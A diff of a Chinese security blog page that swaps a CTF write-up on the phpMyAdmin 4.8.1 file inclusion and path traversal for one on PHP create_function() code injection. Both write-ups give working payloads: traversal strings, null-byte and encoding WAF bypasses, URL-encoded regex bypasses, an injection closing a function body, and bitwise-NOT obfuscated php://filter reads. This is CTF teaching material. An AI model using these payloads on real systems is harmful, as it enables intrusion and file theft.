@@ -6,20 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>phpmyadmin4.8.1 任意文件包含漏洞 | Welcome to Tristan&#39;s Blog!</title>
+  <title>Create_function | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞知识点1、phpmyadmin4.8.1 代码审计2、文件包含漏洞3、目录遍历漏洞4、利用文件包含漏洞拿shell HCTF-WarmUp最近刷BUU，发现GWCTF和HCTF都考到了这个知识点，于是总结一下。打开页面，得到源码： &lt;?php highlight_file(__FILE__); class emmm {">
+  <meta name="description" content="由一道CTF题学Create_function()代码注入知识点1、绕过$_SERVER[Query_string]正则匹配2、绕过&#x2F;^xxx$&#x2F;形式的正则匹配3、利用$REQUEST中存储GET、POST顺序绕过正则匹配4、sha1加密绕过5、核心知识：create_function()代码注入 解题(1)打开页面，是个很酷炫的前端（然而没有什么可用的信息），F12查看源码，经过Base32解码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="phpmyadmin4.8.1 任意文件包含漏洞">
-<meta property="og:url" content="http://yoursite.com/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="Create_function">
+<meta property="og:url" content="http://yoursite.com/2020/04/18/Create-function/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞知识点1、phpmyadmin4.8.1 代码审计2、文件包含漏洞3、目录遍历漏洞4、利用文件包含漏洞拿shell HCTF-WarmUp最近刷BUU，发现GWCTF和HCTF都考到了这个知识点，于是总结一下。打开页面，得到源码： &lt;?php highlight_file(__FILE__); class emmm {">
+<meta property="og:description" content="由一道CTF题学Create_function()代码注入知识点1、绕过$_SERVER[Query_string]正则匹配2、绕过&#x2F;^xxx$&#x2F;形式的正则匹配3、利用$REQUEST中存储GET、POST顺序绕过正则匹配4、sha1加密绕过5、核心知识：create_function()代码注入 解题(1)打开页面，是个很酷炫的前端（然而没有什么可用的信息），F12查看源码，经过Base32解码">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-04-11T07:18:28.000Z">
-<meta property="article:modified_time" content="2020-04-11T09:59:34.692Z">
+<meta property="og:image" content="http://yoursite.com/2020/04/18/images/32.jpg">
+<meta property="article:published_time" content="2020-04-18T12:06:29.000Z">
+<meta property="article:modified_time" content="2020-04-18T13:38:23.361Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="php代码审计，文件包含">
+<meta property="article:tag" content="代码审计、代码注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/18/images/32.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
   
@@ -137,100 +139,114 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-phpmyadmin4-8-1-任意文件包含漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Create-function" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      phpmyadmin4.8.1 任意文件包含漏洞
+      Create_function
     </h1>
   
 
         
-        <a href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2020-04-11T07:18:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-11</time>
+        <a href="/2020/04/18/Create-function/" class="archive-article-date">
+  	<time datetime="2020-04-18T12:06:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="从一道CTF题学习phpmyadmin4-8-1任意文件包含漏洞"><a href="#从一道CTF题学习phpmyadmin4-8-1任意文件包含漏洞" class="headerlink" title="从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞"></a>从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、phpmyadmin4.8.1 代码审计<br>2、文件包含漏洞<br>3、目录遍历漏洞<br>4、利用文件包含漏洞拿shell</p>
-<h5 id="HCTF-WarmUp"><a href="#HCTF-WarmUp" class="headerlink" title="HCTF-WarmUp"></a>HCTF-WarmUp</h5><p>最近刷BUU，发现GWCTF和HCTF都考到了这个知识点，于是总结一下。<br>打开页面，得到源码：</p>
+        <h3 id="由一道CTF题学Create-function-代码注入"><a href="#由一道CTF题学Create-function-代码注入" class="headerlink" title="由一道CTF题学Create_function()代码注入"></a>由一道CTF题学Create_function()代码注入</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、绕过$_SERVER[Query_string]正则匹配<br>2、绕过/^xxx$/形式的正则匹配<br>3、利用$REQUEST中存储GET、POST顺序绕过正则匹配<br>4、sha1加密绕过<br>5、核心知识：create_function()代码注入</p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>(1)打开页面，是个很酷炫的前端（然而没有什么可用的信息），F12查看源码，经过Base32解码找到关键页面，直接给了源代码：</p>
 <pre><code>&lt;?php
 highlight_file(__FILE__);
-class emmm
-{
-    public static function checkFile(&amp;$page)
-    {
-        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 
-        if (! isset($page) || !is_string($page)) {
-            echo &quot;you can&apos;t see it&quot;;
-            return false;
-        }
+error_reporting(0); 
 
-        if (in_array($page, $whitelist)) {
-            return true;
-        }
+$file = &quot;1nD3x.php&quot;;
+$shana = $_GET[&apos;shana&apos;];
+$passwd = $_GET[&apos;passwd&apos;];
+$arg = &apos;&apos;;
+$code = &apos;&apos;;
 
-        $_page = mb_substr(
-            $page,
-            0,
-            mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-        );         //将$page中?前面的部分截取出来赋值给$_page
-        if (in_array($_page, $whitelist)) {
-            return true;
-        }
+echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;
 
-        $_page = urldecode($page);//因为浏览器会自动进行一次URL解码，所以若是经过二次编码，则在该处进行第二次URL解码
-        $_page = mb_substr(
-            $_page,
-            0,
-            mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-        );
-        if (in_array($_page, $whitelist)) {
-            return true;
-        }
-        echo &quot;you can&apos;t see it&quot;;
-        return false;
-    }
+if($_SERVER) { 
+    if (
+        preg_match(&apos;/shana|debu|aqua|cute|arg|code| flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&apos;|log/i&apos;, $_SERVER[&apos;QUERY_STRING&apos;])
+        )  
+        die(&apos;You seem to want to do something bad?&apos;); 
 }
 
-if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
-    &amp;&amp; is_string($_REQUEST[&apos;file&apos;])  ##是字符串
-    &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])  ##上面checkfile返回为true
-) {
-    include $_REQUEST[&apos;file&apos;];
-    exit;
-} else {
-    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-}  
-?&gt;</code></pre><p>通过分析代码，要求：<br>（1）$_REQUEST[‘file’] 不能为空，<br>（2）$_REQUEST[‘file’]是字符串，<br>（3）并且checkFile返回为true，才能包含$_REQUEST[‘file’]<br>突破的要点应该就是checkFile()函数，接下来重点研究一下：<br>要使得checkFile()为True，总共有三条路径：</p>
-<pre><code>if (in_array($page, $whitelist)) {
-    return true;
-}</code></pre><p>直接将变量进入白名单检验，因为没有对$page进行任何处理，所以无法绕过；<br>再看第二条路径：</p>
-<pre><code>$_page = mb_substr(
-       $page,
-       0,
-       mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-   );         //将$page中?前面的部分截取出来赋值给$_page
-   if (in_array($_page, $whitelist)) {
-       return true;
-   }</code></pre><p>mb_substr()是以0为起始位置，第三参数值为长度，切割$page变量，将其赋给$_page；<br>既然是以“?”为分割点，可不可以提前构造“?”使得切割部分可控呢？<br>又因为source.php在白名单列表中，构造payload:</p>
-<pre><code>index.php?source.php?/../../../../../ffflllaaaggg</code></pre><p>但不可行，原因在于；当传入这样的payload后，$page=source.php?/../../../../../ffflllaaaggg,经过mb_substr()分割后的$_page=source.php成功绕过白名单检测；<br>但在文件包含时，实际包含的内容是”include(source.php?../../../../../ffflllaaaggg)”,服务器会将?后的内容当作参数处理，因此无法实现文件包含；第二条路径走不通；<br>看最后一条路：</p>
-<pre><code>$_page = urldecode($page);//因为服务器会自动进行一次URL解码，所以若是经过二次编码，则在该处进行第二次URL解码
-    $_page = mb_substr(
-        $_page,
-        0,
-        mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-    );
-    if (in_array($_page, $whitelist)) {
-        return true;
-    }</code></pre><p>发现多了一个urldecode()函数；这时可以利用这个函数，在浏览器传入双重url编码的”?”,%253f;因为服务器会自动进行一次url解码，所以此时$page=source.php%3f/../../../../ffflllaaaggg;再经过urldecode()解码后成功绕过白名单；<br>此时文件包含的内容是include(source.php%3f/../../../../../ffflllaaaggg)<br>成功包含目标文件，得到flag；<br>而phpmyadmin4.8.1文件包含漏洞原理与上面分析基本一样；</p>
-<h3 id="利用该漏洞拿shell"><a href="#利用该漏洞拿shell" class="headerlink" title="利用该漏洞拿shell"></a>利用该漏洞拿shell</h3><p>既然该漏洞可以任意包含文件，是不是可以通过对某些文件添加一句话木马，然后调用该文件实现拿shell；这里直接引用某位师傅的博客：<a href="https://www.cnblogs.com/bmjoker/p/9897436.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9897436.html</a> (这次直接使用的BUU上的题目环境，没有本地搭建；导致文件修改后的路径找不到，无法利用shell，下次本地搭建后，再来填坑)<br>填坑：session_id路径应为：/var/lib/php/sessions/sess_id 即可成功拿shell</p>
-<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>对于小白来说可能并不理解../../../../的作用；<br>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名形如：<a href="http://www.nuanyue.com/getfile=image.jgp" target="_blank" rel="noopener">http://www.nuanyue.com/getfile=image.jgp</a><br>当服务器处理传送过来的image.jpg文件名后，Web应用程序即会自动添加完整路径，形如“d://site/images/image.jpg”，将读取的内容返回给访问者。<br>由于文件名可以任意更改而服务器支持“~/”，“../”等特殊符号的目录回溯，从而使攻击者越权访问或者覆盖敏感数据，如网站的配置文件、系统的核心文件，这样的缺陷被命名为路径遍历漏洞。当我们传入../../../../时，其实就是起到往上一层父目录跳转的作用，最终到达根目录；<br>对于某些waf，可以使用以下方法绕过：<br>(1) 加密参数传递的数据；<br>在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg- “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。<br>(2) 编码绕过，<br>尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。<br>(3) 目录限定绕过；<br>在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号”~“来绕过。形如这样的提交“downfile.jsp?filename=~/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。<br>(4) 绕过文件后缀过滤；<br>一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。<br>例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。<br>在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20</p>
+if (!preg_match(&apos;/http|https/i&apos;, $_GET[&apos;file&apos;])) {
+    if (preg_match(&apos;/^aqua_is_cute$/&apos;, $_GET[&apos;debu&apos;]) &amp;&amp; $_GET[&apos;debu&apos;] !== &apos;aqua_is_cute&apos;) { 
+    $file = $_GET[&quot;file&quot;]; 
+    echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;
+    } 
+} else die(&apos;fxck you! What do you want to do ?!&apos;);
+
+if($_REQUEST) { 
+    foreach($_REQUEST as $value) { 
+        if(preg_match(&apos;/[a-zA-Z]/i&apos;, $value))  
+            die(&apos;fxck you! I hate English!&apos;); 
+    } 
+} 
+
+if (file_get_contents($file) !== &apos;debu_debu_aqua&apos;)
+    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&apos;t it ?&lt;br&gt;&quot;);
+
+
+if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){
+extract($_GET[&quot;flag&quot;]);
+echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;
+} else{
+die(&quot;fxck you! you don&apos;t know my password! And you don&apos;t know sha1! why you come here!&quot;);
+}
+
+if(preg_match(&apos;/^[a-z0-9]*$/isD&apos;, $code) || 
+preg_match(&apos;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&apos;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&apos;, $arg) ) { 
+die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&apos;t get my flag =w=&quot;); 
+} else { 
+include &quot;flag.php&quot;;
+$code(&apos;&apos;, $arg); 
+} ?&gt; </code></pre><p>总体来说，要先绕过 1 – 5 五个过滤，其中 5 最好绕，而且是跟其他四个条件没关系的，直接对变量名传递数组即可。之后看 4，打开我们传递的$file变量文件，且里面的内容要等于给定值；想到 data://；但是直接绕过的话有两个问题，第一 debu 作为关键字被过滤条件 1 拦截，但是无所谓，可以使用 URL 编码绕过；这是因为$_SERVER[‘QUERY_STRING’]在传递变量后，并没有进行URLDecode，而GET[ ]会进行urldecode，所以只要将我们的变量进行Urlencode传入，绕过对$_SERVER[query_string]的正则匹配；<br>第二 file 变量的内容只有绕过了过滤条件 2 才可控，因此再看 2。<br>绕过过滤条件 2 我们需要传递 debu 参数，这个 debu 的值不能等于 aqua_is_cute 但是需要被正则 ^aqua_is_cute$ 匹配到，这里需要利用 preg_match() 的一个 feature，就是在最后加一个 %0a，依然可以被正则匹配到，而且这样变量 debu 的值就和字符串不相等了，完美绕过。<br>至此，file 变量已经可控，但是 file 无论如何也得带字母，还得考虑 3，但是仔细看源码，接受参数的地方都是 $_GET，而 3 的过滤对象是 $_REQUEST，由于 $_REQUEST 在解析的时候有顺序，POST 过来的变量会覆盖掉 GET 到的同名变量，因此需要再 post 过去 file=1 就可以绕过。到现在前五个过滤条件就完美绕过了，这时候的 payload：</p>
+<pre><code>?%64%65%62%75=%61qua%5fis%5fcut%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;a%73%68%61%6e%61[]=1&amp;
+%70%61%73%73%77%64[]=2
+
+POST
+%64%65%62%75=1&amp;file=1</code></pre><p>接下来就到了最关键的一个地方，我们可以看到变量$arg和$code是用户可控的；这是因为有extract($flag),extract()会将变量键值对分别作为变量名和对应变量值；比如传递数组$flag[arg]=1&amp;$flag[code]=2;此时变量$arg和$code就由我们控制；<br>可以看到$code(‘’, $arg);联想到create_function();<br>先来讲解一下create_function()的基本原理：<br>create_function()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用。</p>
+<pre><code>string create_function    ( string $args   , string $code   )</code></pre><p>举个栗子：</p>
+<pre><code>create_function(&apos;$fname&apos;,&apos;echo &quot;zhang&quot;.$fname&apos;)</code></pre><p>上面这个匿名函数的作用等同于：</p>
+<pre><code>function aa($fname) 
+{
+echo &quot;Zhang&quot;.$fname.;
+}</code></pre><p>真本该是一个利于开发者的操作，但如果对$arg和$code不进行过滤控制，则可能导致代码注入；<br>再举一个栗子：<br>如果$fname=;}phpinfo();//<br>那么上面的执行函数就会变成这样：</p>
+<pre><code>function aa($fname)
+{
+    echo &quot;zhang&quot;;}phpinfo();//
+}
+
+格式调整一下：
+function aa($fname)
+{
+    echo &quot;zhang&quot;;}
+    phpinfo();//}</code></pre><p>成功使用}闭合函数aa，并使得我们构造的phpinfo()函数逃逸，成功执行，“//”主要是将原本函数aa的大括号注释，保证php语法正确；<br>因此，我们完全可以在这块，上传一句话木马拿shell；这就是Create_function的代码注入问题基本原理；<br>回到这道题，可以通过传递$code=create_function&amp;$arg=}a();//<br>这里a()就是我们用来读取flag的操作函数；这时看条件6，发现过滤了成吨的东西，包括我们常用的读flag命令；但发现包含了“flag.php”，那应该有对应的flag变量在其中，考虑有没有一种函数可以显示所有变量对应的值；PHP中get_defined_vars()是可以实现的；<br>此时payload:</p>
+<pre><code>解码后：1nD3x.php?debu=aqua_is_cute%0a&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=1&amp;flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function
+同时post
+debu=1&amp;file=2</code></pre><p>但是得到的是假flag….给了真flag的位置realf1ag.php<br>就想包含realf1ag.php，读出源码；因为Include被ban了，使用require()，再加上伪协议读源码（这姿势…顶不住，学到了）<br>shana师傅的payload:</p>
+<pre><code>require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));//</code></pre><p>中间取反结果是：</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=realf1ag.php</code></pre><p>附上取反脚本：</p>
+<pre><code>&lt;?
+$a = &quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a l f 1 a g . p h p&quot;;
+$arr1 = explode(&apos; &apos;, $a);
+echo &quot;&lt;br&gt;~(&quot;;
+foreach ($arr1 as $key =&gt; $value) {
+    echo &quot;%&quot;.bin2hex(~$value);
+}
+echo &quot;)&lt;br&gt;&quot;;</code></pre><p>最后将得到的源码进行base64解码，得到flag<br><img src="../images/32.jpg" alt="1"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、主要学习几种绕过正则匹配的姿势<br>2、学习create_function()代码注入原理</p>
 
       
 
@@ -244,7 +260,7 @@ if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">php代码审计，文件包含</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计、代码注入</a>
         		</li>
       		
 		</ul>
@@ -300,7 +316,7 @@ if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/18/Create-function/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -314,18 +330,18 @@ if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
   
 <nav id="article-nav">
   
-    <a href="/2020/04/11/Online-tool/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/04/19/File-Upload-Phar/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Online-tool
+          File_Upload_Phar
         
       </div>
     </a>
   
   
-    <a href="/2020/04/10/SSRF-me/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SSRF_me</div>
+    <a href="/2020/04/15/Linux-Shell-Upgrade/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux Shell-Upgrade</div>
       <i class="icon-circle-right"></i>
     </a>
   
